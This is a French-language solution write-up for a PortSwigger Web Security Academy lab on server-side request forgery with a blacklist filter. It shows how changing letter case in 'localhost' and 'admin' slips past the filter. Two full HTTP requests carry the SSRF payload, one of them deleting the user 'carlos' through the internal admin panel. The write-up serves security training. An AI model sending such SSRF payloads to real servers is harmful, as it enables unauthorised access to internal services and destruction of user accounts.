# Lab

https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

## Solution

Le lab bloque les requêtes de check de stock où le paramètre `stockApi` contient `localhost` ou `admin`.

On peut contourner le filtre juste en changeant la casse de `localhost` en `localhOst` et `admin` en `admIn`.

```http
POST /product/stock HTTP/2
Host: 0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net
Cookie: session=q6ZS4qXzD9iDB36nThq4kg9teV4GxcAh
Content-Length: 31
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://localhOst/admIn
```

Ensuite on peut faire l'appel pour supprimer l'utilisateur `carlos`:

```http
POST /product/stock HTTP/2
Host: 0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net
Cookie: session=q6ZS4qXzD9iDB36nThq4kg9teV4GxcAh
Content-Length: 54
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7b00ad03a3072883947d9e00ea0092.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://localhOst/admIn/delete?username=carlos
```